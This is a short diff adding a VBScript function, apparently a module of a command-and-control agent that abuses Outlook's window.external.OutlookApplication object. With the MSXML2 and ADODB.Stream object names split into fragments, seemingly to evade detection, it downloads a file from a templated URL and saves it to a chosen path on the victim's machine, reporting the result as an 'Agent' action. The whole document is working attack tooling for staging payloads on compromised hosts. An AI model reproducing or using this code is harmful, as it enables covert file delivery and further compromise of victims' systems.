@@ -1,0 +1,22 @@
+Function download_filehttp()
+	On error resume next
+	Set oHTTP = window.external.OutlookApplication.CreateObject("MSX" & "ML2.ServerXM" & "LHTTP")
+	oHTTP.open "GET", {{url}}, False
+	oHTTP.send
+	If oHTTP.Status = 200 Then
+		Dim stream
+		Set stream = window.external.OutlookApplication.CreateObject("ADO" & "DB.STR" & "EAM")
+		With stream
+			.Type = 1
+			.Open
+			.Write oHTTP.ResponseBody
+			.SaveToFile {{destination}}
+			.Close
+		End With
+		retval = "Agent Downloaded file: " & {{url}} & " to " & {{destination}} & " - Success"
+	Else
+		retval = "Agent Downloaded file: " & {{url}} & " to " & {{destination}} & " - Failed!"
+	End If
+	
+	download_filehttp = retval
+End Function
